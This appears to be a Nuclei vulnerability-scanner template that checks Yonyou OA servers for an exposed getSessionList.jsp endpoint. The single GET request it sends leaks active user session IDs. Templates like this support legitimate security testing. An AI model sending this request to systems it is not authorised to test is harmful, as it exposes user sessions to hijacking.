id: yyoa-sessions

info:
  name: yyoa sessions
  author: momika233
  severity: critical
  reference:
    - https://github.com/momika233
  tags: yyoa,sessions

requests:
  - method: GET
    path:
      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "usrID.*"
        part: body

      - type: status
        status:
          - 200